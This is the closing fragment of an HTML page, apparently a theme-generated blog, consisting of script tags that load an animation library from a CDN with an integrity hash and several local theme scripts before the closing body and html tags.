  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
